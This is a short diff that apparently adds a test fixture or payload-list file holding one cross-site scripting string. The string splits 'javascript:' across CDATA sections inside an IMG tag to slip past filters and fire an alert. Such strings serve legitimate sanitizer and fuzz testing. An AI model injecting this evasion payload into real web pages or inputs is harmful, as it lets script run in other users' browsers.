@@ -1,0 +1,2 @@
+<?xml version="1.0" encoding="UTF-8"?>
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
